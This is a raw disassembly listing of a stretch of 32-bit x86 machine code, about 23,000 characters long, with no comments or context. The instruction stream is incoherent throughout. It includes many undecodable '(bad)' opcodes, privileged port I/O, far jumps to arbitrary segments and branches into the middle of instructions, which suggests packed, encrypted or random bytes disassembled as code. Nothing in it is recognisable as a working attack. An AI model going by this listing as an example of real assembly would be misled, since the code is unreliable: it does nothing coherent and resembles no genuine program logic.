  412bdb:	jmp    0xcfda21a5
  412be0:	cwde   
  412be1:	fistp  QWORD PTR [edi]
  412be3:	sti    
  412be4:	push   0xffffffc8
  412be6:	fdivr  QWORD PTR [ecx+0x2b]
  412be9:	arpl   WORD PTR [eax-0x48],di
  412bec:	adc    dl,BYTE PTR [esi]
  412bee:	xor    BYTE PTR [esi+0x67],al
  412bf1:	mov    bl,0x5d
  412bf3:	aad    0x82
  412bf5:	int3   
  412bf6:	fwait
  412bf7:	add    al,dh
  412bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bfa:	pop    ss
  412bfb:	das    
  412bfc:	add    DWORD PTR [esi+0x7e],esp
  412bff:	push   esp
  412c00:	aaa    
  412c01:	pop    ebx
  412c02:	push   edx
  412c03:	shl    DWORD PTR [eax-0x6b],cl
  412c06:	(bad)  
  412c07:	ficomp DWORD PTR [esi+0x732d0537]
  412c0d:	cmp    eax,0x260c6f41
  412c12:	ja     0x412bed
  412c14:	jg     0x412bdd
  412c16:	fst    QWORD PTR [edi]
  412c18:	cmp    esi,DWORD PTR [ebx]
  412c1a:	mov    dl,0xd0
  412c1c:	adc    al,0x34
  412c1e:	mov    dh,0xe2
  412c20:	mov    bl,0x62
  412c22:	add    BYTE PTR [edi+edi*8+0x57],bl
  412c26:	cmp    cl,BYTE PTR [ebx]
  412c28:	into   
  412c29:	dec    esi
  412c2a:	push   cs
  412c2b:	mov    ecx,0x21b18706
  412c30:	or     cl,BYTE PTR [ebp+0x32cde747]
  412c36:	es pop edi
  412c38:	cli    
  412c39:	jo     0x412bdb
  412c3b:	push   ebp
  412c3c:	into   
  412c3d:	rcr    DWORD PTR [edx+0x144a1d9f],0xec
  412c44:	sub    ch,ch
  412c46:	(bad)  
  412c47:	dec    edi
  412c48:	sahf   
  412c49:	jmp    0xaa6ea14b
  412c4e:	mov    ecx,DWORD PTR [esi+esi*8]
  412c51:	add    eax,0x16f5fe18
  412c56:	pop    ss
  412c57:	cmp    bh,BYTE PTR [ebp+0x27544929]
  412c5d:	in     eax,0x5f
  412c5f:	rcr    BYTE PTR ss:[edx+0x4c3bd0b7],1
  412c66:	mov    ebp,0xc3523306
  412c6b:	dec    edi
  412c6c:	xchg   edi,eax
  412c6d:	mov    ebp,0x4021fe90
  412c72:	out    0xb3,eax
  412c74:	mov    ss,esp
  412c76:	and    al,0xa5
  412c78:	mov    edi,0x9e726d1e
  412c7d:	and    BYTE PTR [edi-0x15],ch
  412c80:	aaa    
  412c81:	in     eax,0xa8
  412c83:	les    ecx,FWORD PTR [eax-0x19e5e91b]
  412c89:	or     al,0xec
  412c8b:	in     eax,0x2d
  412c8d:	cmc    
  412c8e:	lods   al,BYTE PTR ds:[esi]
  412c8f:	dec    eax
  412c90:	jge    0x412cf9
  412c92:	jo     0x412d03
  412c94:	mov    fs,WORD PTR [edx+edi*4+0x1fc6c858]
  412c9b:	dec    eax
  412c9c:	out    dx,al
  412c9d:	arpl   WORD PTR [esp+ecx*2+0x1b],sp
  412ca1:	je     0x412cf1
  412ca3:	jmp    0xda0f55a2
  412ca8:	jecxz  0x412c36
  412caa:	inc    ebp
  412cab:	jae    0x412c8a
  412cad:	fisub  DWORD PTR ds:0x90e0f1ab
  412cb3:	mov    ebp,0x12515ca5
  412cb8:	mov    ds:0xa67b63da,eax
  412cbd:	jns    0x412cf7
  412cbf:	jbe    0x412c6a
  412cc1:	aad    0x71
  412cc3:	scas   al,BYTE PTR es:[edi]
  412cc4:	call   DWORD PTR ds:0xff3f8a34
  412cca:	jb     0x412c79
  412ccc:	and    DWORD PTR ds:0xd3c8f69e,ecx
  412cd2:	pop    ebx
  412cd3:	mov    dh,0x8e
  412cd5:	cmp    al,0x85
  412cd7:	xchg   BYTE PTR [eax-0x57],ah
  412cda:	shl    BYTE PTR [esi+ebx*2],1
  412cdd:	popf   
  412cde:	hlt    
  412cdf:	inc    ebx
  412ce0:	mov    edx,0x9107709c
  412ce5:	push   0xee5e81d5
  412cea:	or     BYTE PTR [edi-0x7],ch
  412ced:	mov    eax,ds:0x4cda0a95
  412cf2:	add    eax,0xd48abb75
  412cf7:	mov    cl,0xe0
  412cf9:	repnz mov edi,DWORD PTR [edx-0x72]
  412cfd:	xor    cl,al
  412cff:	jecxz  0x412cfb
  412d01:	call   0xc13fc649
  412d06:	mov    ecx,0x3e40212e
  412d0b:	outs   dx,DWORD PTR ds:[esi]
  412d0c:	retf   0x5837
  412d0f:	adc    dh,bh
  412d11:	hlt    
  412d12:	push   ebx
  412d13:	cmp    eax,0x80f3ae6a
  412d18:	cld    
  412d19:	stc    
  412d1a:	shr    BYTE PTR [esi+0x2],0xa5
  412d1e:	xor    BYTE PTR [edx-0x6b2ef7fe],ch
  412d24:	xlat   BYTE PTR ds:[ebx]
  412d25:	xor    ebx,DWORD PTR [edi]
  412d27:	adc    bh,BYTE PTR [edx]
  412d29:	imul   edx,eax,0x75
  412d2c:	cmc    
  412d2d:	mov    ds:0x2aa993a9,eax
  412d32:	or     eax,eax
  412d34:	imul   DWORD PTR ds:0x3e4c5e03
  412d3a:	xchg   BYTE PTR [ebp+eax*1+0x1],al
  412d3e:	int    0x38
  412d40:	scas   eax,DWORD PTR es:[edi]
  412d41:	xchg   ax,ax
  412d43:	rcr    DWORD PTR [ecx-0x2],cl
  412d46:	mov    bl,0x85
  412d48:	xchg   esi,eax
  412d49:	mov    esp,0x33939a91
  412d4e:	sbb    al,0x2a
  412d50:	jnp    0x412d8d
  412d52:	dec    edi
  412d53:	and    esi,DWORD PTR [esi]
  412d55:	xor    DWORD PTR [edx+esi*8-0x4c],ebp
  412d59:	mov    bl,0xa5
  412d5b:	jnp    0x412db1
  412d5d:	pop    ebp
  412d5e:	cmp    cl,bh
  412d60:	outs   dx,BYTE PTR ds:[esi]
  412d61:	ret    
  412d62:	(bad)  
  412d64:	mov    ds:0x8c8e255b,al
  412d69:	jae    0x412dde
  412d6b:	nop
  412d6c:	(bad)  
  412d6e:	repz test eax,0xc0d4506a
  412d74:	sbb    al,0xf8
  412d76:	mov    bh,0x78
  412d78:	int3   
  412d79:	push   ecx
  412d7a:	je     0x412d6f
  412d7c:	fnstenv [edi+0x74c34142]
  412d82:	into   
  412d83:	mov    bh,0x6a
  412d85:	lahf   
  412d86:	jg     0x412dfb
  412d88:	repz fsubr st,st(4)
  412d8b:	xchg   ebx,eax
  412d8c:	gs add al,0xb5
  412d8f:	dec    ebx
  412d90:	retf   0xceea
  412d93:	add    esp,ebx
  412d95:	arpl   WORD PTR [ebp+0x51bd0a7e],ax
  412d9b:	xchg   ebx,eax
  412d9c:	aad    0x6b
  412d9e:	jg     0x412db4
  412da0:	dec    ebx
  412da1:	add    ah,BYTE PTR [esp+ebp*4]
  412da4:	ficomp WORD PTR [edx*8+0x3c6deea2]
  412dab:	xor    BYTE PTR [edx],bh
  412dad:	inc    ebp
  412dae:	jbe    0x412d93
  412db0:	dec    edi
  412db1:	add    ecx,eax
  412db3:	pop    edx
  412db4:	stc    
  412db5:	daa    
  412db6:	test   dl,bl
  412db8:	inc    esi
  412db9:	int3   
  412dba:	loope  0x412d86
  412dbc:	push   ecx
  412dbd:	cs xchg edx,eax
  412dbf:	mov    dl,0xe5
  412dc1:	adc    DWORD PTR [ebp-0x1119d76b],eax
  412dc7:	inc    esp
  412dc8:	inc    esi
  412dc9:	xchg   ebp,eax
  412dca:	sbb    BYTE PTR [eax-0x6e54269f],cl
  412dd0:	in     eax,dx
  412dd1:	pop    edx
  412dd2:	pop    es
  412dd3:	fmul   DWORD PTR [eax+edx*4+0x47]
  412dd7:	mov    ch,0x4e
  412dd9:	pop    DWORD PTR [eax-0x44]
  412ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ddd:	jbe    0x412d9b
  412ddf:	lahf   
  412de0:	mov    al,ds:0xe6a76f5f
  412de5:	add    DWORD PTR [ebp-0x47e2500b],ebx
  412deb:	loopne 0x412dd6
  412ded:	sbb    al,0x43
  412def:	and    eax,0x5341e5
  412df4:	add    BYTE PTR [ecx+0x7da9afde],cl
  412dfa:	fisubr WORD PTR [esi]
  412dfc:	mov    esi,0x5f3c85de
  412e01:	scas   eax,DWORD PTR es:[edi]
  412e02:	test   BYTE PTR [ecx],al
  412e04:	fwait
  412e05:	stc    
  412e06:	mov    ds:0x52b05bf1,eax
  412e0b:	fnsave es:[esi]
  412e0e:	(bad)
  412e11:	or     eax,0x6fcc6b90
  412e16:	fisubr WORD PTR [ecx]
  412e18:	adc    DWORD PTR [esi],edx
  412e1a:	sbb    BYTE PTR [ebx],bl
  412e1c:	mov    al,ds:0x8319deaf
  412e21:	sbb    DWORD PTR [esi-0x2843ac27],edi
  412e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e28:	cwde   
  412e29:	sbb    eax,0x97b8d92d
  412e2e:	mov    ecx,0x30cb61bb
  412e33:	fs int 0xd9
  412e36:	sahf   
  412e37:	and    eax,0xab871bdd
  412e3c:	pop    es
  412e3d:	mov    eax,ds:0x27b5331f
  412e42:	hlt    
  412e43:	pushf  
  412e44:	into   
  412e45:	icebp  
  412e46:	sub    eax,0xba330d35
  412e4b:	add    eax,0xc443d274
  412e50:	xor    ah,bh
  412e52:	push   0x5912073a
  412e57:	jge    0x412e52
  412e59:	loopne 0x412e6e
  412e5b:	dec    ecx
  412e5c:	mov    bh,0xf1
  412e5e:	ds addr16 out dx,al
  412e61:	cmp    BYTE PTR [edi],dh
  412e63:	(bad)  
  412e64:	jmp    0x412ee3
  412e66:	mov    al,0x21
  412e68:	(bad)  
  412e6a:	imul   edx,esi,0xffffff89
  412e6d:	retf   
  412e6e:	xchg   DWORD PTR [ebx-0x6bf72add],ecx
  412e74:	push   cs
  412e75:	ss stos DWORD PTR es:[edi],eax
  412e77:	inc    edx
  412e78:	iret   
  412e79:	dec    ebp
  412e7a:	jno    0x412eea
  412e7c:	pop    edi
  412e7d:	xchg   ecx,eax
  412e7e:	mov    dl,0xaa
  412e80:	(bad)  [esi]
  412e82:	add    eax,0x75d2acbc
  412e87:	into   
  412e88:	xor    dl,0x4d
  412e8b:	in     eax,0xfa
  412e8d:	xor    eax,0x178d0d81
  412e92:	push   ecx
  412e93:	daa    
  412e94:	mov    esi,ebp
  412e96:	and    DWORD PTR [esi],esp
  412e98:	inc    esp
  412e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e9a:	call   0xad2a:0xb3d7b185
  412ea1:	cmp    DWORD PTR [eax+0x6232446d],edx
  412ea7:	cwde   
  412ea8:	pusha  
  412ea9:	xchg   ebx,eax
  412eaa:	jmp    0x57c2a145
  412eaf:	popf   
  412eb0:	shr    DWORD PTR [ebx-0x65a16745],0xae
  412eb7:	mov    eax,0x8d0266b3
  412ebc:	dec    edi
  412ebd:	jl     0x412f1d
  412ebf:	in     eax,dx
  412ec0:	aam    0x74
  412ec2:	out    dx,eax
  412ec3:	xchg   ebp,eax
  412ec4:	mov    al,ds:0x703f67d3
  412ec9:	sub    ah,BYTE PTR [ebx+0x47fa6fb]
  412ecf:	jl     0x412f2e
  412ed1:	inc    esi
  412ed2:	int    0x6d
  412ed4:	mov    ch,dh
  412ed6:	adc    al,0x34
  412ed9:	mov    cl,0x50
  412edb:	xor    dl,0x7a
  412ede:	push   ebx
  412edf:	clc    
  412ee0:	popf   
  412ee1:	retf   0x7e16
  412ee4:	ds jmp 0xaea2:0x7e9a6f27
  412eec:	or     esi,DWORD PTR [edx+0x1]
  412eef:	fld    DWORD PTR ds:0xc89ee6c9
  412ef5:	js     0x412f20
  412ef7:	(bad)  
  412ef8:	jnp    0x412f50
  412efa:	xchg   ecx,eax
  412efb:	je     0x412f24
  412efd:	fwait
  412efe:	inc    esi
  412eff:	adc    al,BYTE PTR [ebx+0x48b94e6]
  412f05:	call   0x8e9b:0x54a58b6a
  412f0c:	out    dx,eax
  412f0d:	sbb    eax,edi
  412f0f:	dec    edx
  412f10:	jle    0x412f62
  412f12:	mov    esi,0xdb3350db
  412f17:	pop    esi
  412f18:	shl    BYTE PTR [edi-0x6],cl
  412f1b:	and    ah,BYTE PTR [ebx+0x39]
  412f1e:	(bad)  [edi+0xd]
  412f21:	das    
  412f22:	ins    DWORD PTR es:[edi],dx
  412f23:	sub    ebp,ebx
  412f25:	dec    eax
  412f26:	repz out 0x9c,eax
  412f29:	loope  0x412ef4
  412f2b:	mov    eax,0x6bb870f1
  412f30:	cmp    ah,BYTE PTR [ecx-0x22d958f4]
  412f36:	dec    ebx
  412f37:	in     eax,dx
  412f38:	aad    0xc
  412f3a:	les    edx,FWORD PTR [edi+0x67]
  412f3d:	or     al,0xa0
  412f3f:	ror    BYTE PTR ds:0xe7de3618,cl
  412f45:	jo     0x412f8b
  412f47:	int3   
  412f48:	lods   eax,DWORD PTR ds:[esi]
  412f49:	xchg   edx,eax
  412f4a:	push   eax
  412f4b:	push   ebx
  412f4c:	push   cs
  412f4d:	adc    DWORD PTR [ecx+0x64185974],eax
  412f53:	test   BYTE PTR [ebx+0x52c60a0e],bh
  412f59:	std    
  412f5a:	adc    al,0x81
  412f5c:	xchg   edi,eax
  412f5d:	mul    DWORD PTR [edx]
  412f5f:	and    al,0x1e
  412f61:	jge    0x412fac
  412f63:	push   cs
  412f64:	pushf  
  412f65:	mov    gs,edx
  412f67:	xchg   ebx,eax
  412f68:	jno    0x412f2d
  412f6a:	lahf   
  412f6b:	fistp  QWORD PTR [ebx+0x699a95cf]
  412f71:	push   es
  412f72:	xor    BYTE PTR [esi-0x2dc00a67],0xfb
  412f79:	jno    0x412f1e
  412f7b:	lock cmp dh,cl
  412f7e:	scas   eax,DWORD PTR es:[edi]
  412f7f:	mov    esp,0x78ba76ad
  412f84:	ins    DWORD PTR es:[edi],dx
  412f85:	push   eax
  412f86:	jmp    0xb41ee4fd
  412f8b:	push   esi
  412f8c:	mov    ah,0x13
  412f8e:	das    
  412f8f:	dec    edx
  412f90:	or     ebp,ebx
  412f92:	stos   BYTE PTR es:[edi],al
  412f93:	bound  edi,QWORD PTR [edx]
  412f95:	dec    ebp
  412f96:	ds adc al,0x37
  412f99:	int3   
  412f9a:	push   ebx
  412f9b:	add    BYTE PTR [ecx+0x6eb8c624],0xc8
  412fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa3:	xchg   ebx,eax
  412fa4:	pushf  
  412fa5:	adc    BYTE PTR ds:[esi+0x2f],al
  412fa9:	ss pop ss
  412fab:	in     eax,dx
  412fac:	xchg   DWORD PTR [edi+0x65c22629],esp
  412fb2:	cdq    
  412fb3:	fucomp st(3)
  412fb5:	cwde   
  412fb6:	shl    ecx,cl
  412fb8:	push   ecx
  412fb9:	adc    esi,DWORD PTR [esi]
  412fbb:	sub    al,0x2
  412fbd:	sub    ebp,ecx
  412fbf:	aad    0x7d
  412fc1:	inc    esp
  412fc2:	mov    ds:0xdad7778e,al
  412fc7:	call   0xba6:0x4653bb9e
  412fce:	arpl   WORD PTR [eax+0x75],ax
  412fd1:	stos   DWORD PTR es:[edi],eax
  412fd2:	push   DWORD PTR [eax+0x2e68b96]
  412fd8:	ret    0x21e3
  412fdb:	sbb    DWORD PTR [esi-0xd006f04],edi
  412fe1:	rcl    DWORD PTR [esi-0x58f6cd12],0x6e
  412fe8:	xchg   BYTE PTR [esi+0x4262a1a4],ah
  412fee:	and    eax,0x2f84fee5
  412ff3:	mov    ds:0x1d6fb003,eax
  412ff8:	jbe    0x412fc2
  412ffa:	xor    eax,0x15e0ea86
  412fff:	fimul  DWORD PTR [ecx]
  413001:	mov    esi,0xa461d7cb
  413006:	jno    0x412fde
  413008:	jns    0x412f8b
  41300a:	adc    al,0x17
  41300c:	cmp    ch,BYTE PTR [edx+0x53db574f]
  413012:	(bad)  
  413013:	xor    al,0xd4
  413015:	add    ah,BYTE PTR [esi+0x32]
  413018:	push   es
  413019:	or     al,0xa1
  41301b:	mov    bh,0x26
  41301d:	xor    BYTE PTR [esi+0x0],0xa5
  413021:	pop    ss
  413022:	push   ebx
  413023:	repz mov eax,0x6575c86e
  413029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41302a:	rcr    bl,0x9a
  41302d:	adc    eax,0xc16641cc
  413032:	adc    BYTE PTR [esi-0x504db40e],cl
  413038:	xor    eax,0x7d94bddc
  41303d:	sbb    ecx,ebp
  41303f:	mov    eax,0xd69068c2
  413044:	mov    WORD PTR [esp+ecx*2+0x5eff115a],?
  41304b:	mov    edx,0x29505185
  413050:	into   
  413051:	pop    ecx
  413052:	mov    bl,0x96
  413054:	jns    0x41305e
  413056:	test   al,0x32
  413058:	push   esi
  413059:	push   esp
  41305a:	xor    al,0xf8
  41305c:	mov    ch,0x36
  41305e:	mov    ds:0x967240a3,eax
  413063:	in     eax,dx
  413064:	add    edx,esp
  413066:	pop    ecx
  413067:	ret    0x576e
  41306a:	xor    esp,0xc0a0fb40
  413070:	cwde   
  413071:	dec    edx
  413072:	cmp    eax,0x86b614ef
  413077:	inc    esp
  413078:	inc    ebp
  413079:	dec    esp
  41307a:	out    0xe3,al
  41307c:	mov    bl,0xa6
  41307e:	xor    eax,ecx
  413080:	enter  0xfbc6,0x3
  413084:	hlt    
  413085:	nop    DWORD PTR [edx-0x27]
  413089:	push   esi
  41308a:	pop    ebp
  41308b:	retf   
  41308c:	xchg   DWORD PTR [edi+0x38ae20b9],eax
  413092:	stc    
  413093:	aaa    
  413094:	loopne 0x413085
  413096:	cmp    bh,BYTE PTR [esi+0x7214f5be]
  41309c:	pop    esp
  41309d:	out    0x62,eax
  41309f:	or     BYTE PTR [edi+0x3db62201],ah
  4130a5:	pusha  
  4130a6:	out    dx,eax
  4130a7:	jp     0x4130be
  4130a9:	sub    DWORD PTR [eax-0x69c2fad1],0xffffff8d
  4130b0:	sub    BYTE PTR [ebp-0x21771dcd],ch
  4130b6:	mov    ah,0x48
  4130b8:	or     eax,eax
  4130ba:	out    0xd1,al
  4130bc:	inc    eax
  4130bd:	push   ss
  4130be:	mov    eax,ds:0x6c62db16
  4130c3:	inc    esp
  4130c4:	pop    ebx
  4130c5:	aaa    
  4130c6:	imul   eax,DWORD PTR [ecx-0x5e8daad6],0x46
  4130cd:	je     0x413124
  4130cf:	sbb    al,0x2f
  4130d1:	pop    eax
  4130d2:	jp     0x413124
  4130d4:	ja     0x41307d
  4130d6:	mov    gs,WORD PTR [esi-0x74]
  4130d9:	std    
  4130da:	xlat   BYTE PTR ds:[ebx]
  4130db:	out    0x94,eax
  4130dd:	add    ch,BYTE PTR [eax]
  4130df:	jae    0x41312a
  4130e1:	mov    ebx,0xebbc912f
  4130e6:	mov    dh,BYTE PTR [eax+esi*8]
  4130e9:	clc    
  4130ea:	or     esp,DWORD PTR [ebp-0x6ea49ce1]
  4130f0:	lds    edi,FWORD PTR [ebp+0x49af385a]
  4130f6:	cs rol edi,1
  4130f9:	fimul  WORD PTR [esi+0x73]
  4130fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130fd:	(bad)  
  4130fe:	adc    al,BYTE PTR [ebx+edx*8-0x65f40feb]
  413105:	adc    BYTE PTR [eax],ch
  413107:	lds    ebx,FWORD PTR ss:[eax+0x2d1418e9]
  41310e:	leave  
  41310f:	lahf   
  413110:	and    ebp,DWORD PTR [eax]
  413112:	jne    0x413145
  413114:	jl     0x413110
  413116:	sub    DWORD PTR [ecx+0xa826392],edi
  41311c:	fcmovb st,st(3)
  41311e:	dec    edx
  41311f:	repz xor ecx,DWORD PTR [ebx-0x4a667038]
  413126:	adc    bh,BYTE PTR [ebx-0x53]
  413129:	jp     0x413170
  41312b:	sub    esi,ecx
  41312d:	shl    BYTE PTR [edx+0x678a4500],cl
  413133:	rol    cl,cl
  413135:	pushf  
  413136:	addr16 push edx
  413138:	mov    cl,BYTE PTR [edi-0x7]
  41313b:	or     BYTE PTR [ecx+0x27],bl
  41313e:	sbb    dh,BYTE PTR [edx+0x40845639]
  413144:	xchg   esi,eax
  413145:	push   ds
  413146:	or     eax,0x50e8fd8d
  41314b:	cwde   
  41314c:	loope  0x413101
  41314e:	sub    cl,BYTE PTR [edx+0x64]
  413151:	adc    al,0xb7
  413153:	xor    eax,DWORD PTR [ebx-0x3fb24372]
  413159:	mov    BYTE PTR [bp+di-0x51],0xa1
  41315e:	outs   dx,DWORD PTR ds:[esi]
  41315f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413160:	pop    ecx
  413161:	iret   
  413162:	or     edx,ecx
  413164:	aaa    
  413165:	cmp    eax,0x434256b6
  41316a:	lds    eax,FWORD PTR [ebx-0x41]
  41316d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41316e:	test   DWORD PTR [ebx+0x7f],0xc069afad
  413175:	stos   BYTE PTR es:[edi],al
  413176:	adc    bh,BYTE PTR [esi]
  413178:	ins    DWORD PTR es:[edi],dx
  413179:	test   BYTE PTR [ecx],dl
  41317b:	loop   0x413122
  41317d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41317e:	push   esp
  41317f:	bound  eax,QWORD PTR [ecx+0x2d]
  413182:	push   eax
  413183:	aam    0xe1
  413185:	repnz xacquire xchg BYTE PTR ds:0xa5c699d3,cl
  41318d:	jg     0x413160
  41318f:	nop
  413190:	or     DWORD PTR [edx],esi
  413192:	arpl   WORD PTR [edx-0x2b],dx
  413195:	addr16 mov dl,0x3f
  413198:	out    dx,al
  413199:	fdiv   QWORD PTR [edx+ebx*2+0x70]
  41319d:	in     al,0x2d
  41319f:	or     eax,0xaea7d56d
  4131a4:	push   ss
  4131a5:	xor    DWORD PTR [ebp+0x18430b83],eax
  4131ab:	dec    edx
  4131ac:	mov    edi,0x67f267fe
  4131b1:	xchg   ebp,eax
  4131b2:	in     al,0xad
  4131b4:	dec    ebx
  4131b5:	fbld   TBYTE PTR [edx]
  4131b7:	das    
  4131b8:	in     eax,dx
  4131b9:	xor    DWORD PTR [ecx],edi
  4131bb:	add    al,0xc
  4131bd:	call   0xe8cf:0x98f456ce
  4131c4:	mov    WORD PTR [ecx-0x19],ss
  4131c7:	outs   dx,BYTE PTR ds:[esi]
  4131c8:	mov    ds:0x95f9559b,al
  4131cd:	pop    ebp
  4131ce:	adc    DWORD PTR [edi-0x64],edx
  4131d1:	in     al,dx
  4131d2:	nop
  4131d3:	push   es
  4131d4:	or     ebx,DWORD PTR [edi-0x67e46b85]
  4131da:	nop    DWORD PTR [edi-0x6ced456d]
  4131e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e2:	cwde   
  4131e3:	cwde   
  4131e4:	or     bl,bl
  4131e6:	dec    esp
  4131e7:	sahf   
  4131e8:	inc    ebx
  4131e9:	fs sbb al,0x2e
  4131ec:	push   ds
  4131ed:	or     ebp,eax
  4131ef:	test   eax,0xc1633ae2
  4131f4:	fisttp WORD PTR [edi-0x399e9335]
  4131fa:	add    esp,0x5af1b5b1
  413200:	cs shr dh,cl
  413203:	mov    ds:0x3063bbcc,al
  413208:	xchg   esi,eax
  413209:	js     0x413255
  41320b:	mov    eax,ds:0x4c82c11e
  413210:	mov    DWORD PTR [ebx-0x3b],ebp
  413213:	mov    esp,0x7f9e2bfc
  413218:	std    
  413219:	mov    eax,0x20dad205
  41321e:	add    eax,0xe3200ebc
  413223:	shl    DWORD PTR [edi+0x3ea574d9],1
  413229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41322a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41322b:	inc    esi
  41322c:	ror    DWORD PTR [ebx+edi*8],cl
  41322f:	xchg   cl,bl
  413231:	push   ds
  413232:	cld    
  413233:	and    BYTE PTR [ecx-0x57],al
  413236:	pushf  
  413237:	and    al,BYTE PTR [ecx+0xb]
  41323a:	jne    0x413297
  41323c:	out    dx,al
  41323d:	hlt    
  41323e:	xchg   esp,eax
  41323f:	ds or  bh,cl
  413242:	mov    bh,0xf5
  413244:	xchg   esi,eax
  413245:	and    eax,0xadc34887
  41324a:	pop    ebx
  41324b:	in     al,dx
  41324c:	sbb    esi,edi
  41324e:	test   al,0x4
  413250:	mov    esi,0xb26f30cc
  413255:	and    DWORD PTR [edi-0x4f],esi
  413258:	sub    eax,0xbade6d88
  41325d:	stos   BYTE PTR es:[edi],al
  41325e:	mov    al,0xc0
  413260:	mov    bh,0x28
  413262:	pop    es
  413263:	xor    eax,0xab61429c
  413268:	jmp    0x413243
  41326a:	xchg   edx,eax
  41326b:	xchg   BYTE PTR [edi+0x3bdb6d1b],cl
  413271:	or     al,bl
  413273:	out    0x64,eax
  413275:	sub    DWORD PTR [ebp-0x14b76774],0x1f
  41327c:	mov    ds:0xfa711594,eax
  413281:	mov    al,ds:0x6ed607f4
  413286:	pop    esi
  413287:	js     0x4132de
  413289:	xor    BYTE PTR [edx],0xb2
  41328c:	lods   al,BYTE PTR ds:[esi]
  41328d:	jb     0x413225
  41328f:	icebp  
  413290:	mov    BYTE PTR [edi],dl
  413292:	xchg   edi,eax
  413293:	out    dx,al
  413294:	mov    al,0x2c
  413296:	push   0xb1e10777
  41329b:	(bad)  
  41329c:	outs   dx,BYTE PTR ds:[esi]
  41329d:	rcr    DWORD PTR [edi],0x83
  4132a0:	mov    ecx,0xeab234b7
  4132a5:	stos   DWORD PTR es:[edi],eax
  4132a6:	jp     0x41326a
  4132a8:	out    0x35,eax
  4132aa:	jo     0x41325d
  4132ac:	div    edx
  4132ae:	enter  0xe81e,0xdc
  4132b2:	adc    ah,BYTE PTR [edx]
  4132b4:	mov    bl,0x18
  4132b6:	sbb    edx,DWORD PTR [edi]
  4132b8:	xor    BYTE PTR [edi-0x3f65ed3a],0xdf
  4132bf:	or     al,bh
  4132c1:	xor    eax,0xdeb69d0b
  4132c6:	cs adc eax,0x553bc6a7
  4132cc:	mov    BYTE PTR [esi],al
  4132ce:	jecxz  0x4132cc
  4132d0:	inc    eax
  4132d1:	daa    
  4132d2:	mov    DWORD PTR [ebx],esi
  4132d4:	inc    esp
  4132d5:	pop    edx
  4132d6:	lods   eax,DWORD PTR ds:[esi]
  4132d7:	sub    BYTE PTR [eax],al
  4132d9:	data16 data16 mov es,WORD PTR [eax]
  4132dd:	mov    eax,ds:0x66f92f9f
  4132e2:	stos   BYTE PTR es:[edi],al
  4132e3:	sbb    DWORD PTR [ebx+0x66],ebx
  4132e6:	and    eax,0x1d62cea0
  4132eb:	idiv   DWORD PTR [ebx]
  4132ed:	adc    al,0xd
  4132ef:	pusha  
  4132f0:	jne    0x41335a
  4132f2:	push   eax
  4132f3:	das    
  4132f4:	scas   eax,DWORD PTR es:[edi]
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	mov    ecx,0xcc746cfe
  4132fb:	out    dx,eax
  4132fc:	sub    ebp,DWORD PTR [edi]
  4132fe:	fld    DWORD PTR [edx-0x69]
  413301:	push   edi
  413302:	out    0xe0,eax
  413304:	stos   DWORD PTR es:[edi],eax
  413305:	shr    DWORD PTR [ecx+0x11],cl
  413308:	(bad)  
  413309:	std    
  41330a:	xchg   edx,eax
  41330b:	add    al,0x9b
  41330d:	dec    DWORD PTR [edi+esi*4-0x333030fe]
  413314:	jmp    0xc0ee:0xb440650b
  41331b:	mov    esi,0x87e0c88b
  413320:	popf   
  413321:	aas    
  413322:	je     0x41334c
  413324:	repz xor eax,0x4f7fe17a
  41332a:	fwait
  41332b:	adc    eax,DWORD PTR [eax+eiz*4+0x744574b7]
  413332:	push   edi
  413333:	mov    cs,WORD PTR fs:[eax-0xa]
  413337:	jne    0x4132d6
  413339:	push   eax
  41333a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41333b:	ds mov edi,ds
  41333e:	and    DWORD PTR [ebx-0x59],esi
  413341:	add    ecx,edx
  413343:	adc    al,0x83
  413345:	xor    al,0x4a
  413347:	popf   
  413348:	mov    cl,BYTE PTR [eax]
  41334a:	sbb    bl,BYTE PTR [edi+0x536fbf67]
  413350:	arpl   WORD PTR [edx-0x2c9b138d],si
  413356:	inc    edx
  413357:	mov    al,0x2c
  413359:	mov    al,0xfa
  41335b:	inc    ebx
  41335c:	mov    al,0xee
  41335e:	mov    ebx,0x8cd7463c
  413363:	cmp    eax,0x61922ac4
  413368:	jmp    0xe94e2c3b
  41336d:	ins    DWORD PTR es:[edi],dx
  41336e:	ret    
  41336f:	mov    bh,0x48
  413371:	jmp    0xcfda:0x832acebd
  413378:	test   BYTE PTR [edx-0x44],ch
  41337b:	jge    0x4133ab
  41337d:	sub    al,0x41
  41337f:	push   ebx
  413380:	addr16 ss sti 
  413383:	xor    dh,dh
  413385:	jmp    FWORD PTR [edi+0x24]
  413388:	imul   ebx,edi,0x1b
  41338b:	out    dx,al
  41338c:	(bad)  
  41338d:	stos   BYTE PTR es:[edi],al
  41338e:	popf   
  41338f:	loopne 0x413369
  413391:	pop    ss
  413392:	xchg   esp,eax
  413393:	in     al,dx
  413394:	xor    DWORD PTR [ebp-0x3894743],ebp
  41339a:	stos   DWORD PTR es:[edi],eax
  41339b:	mov    ds:0x172f7ca,eax
  4133a0:	popf   
  4133a1:	imul   edi,DWORD PTR [esi+0x35aef939],0xf4ca9b29
  4133ab:	cwde   
  4133ac:	stos   BYTE PTR es:[edi],al
  4133ad:	dec    ebx
  4133ae:	jnp    0x4133ba
  4133b0:	vprotb ymm1,[ecx],xmm1
  4133b5:	push   ds
  4133b6:	pop    es
  4133b7:	mov    esp,0xa2f90a42
  4133bc:	lds    ebp,FWORD PTR ds:0x8953b281
  4133c2:	push   esp
  4133c3:	or     ebx,DWORD PTR [edx+ecx*4+0x7003d412]
  4133ca:	test   DWORD PTR [edi+0x3c],0xc3bd4fe2
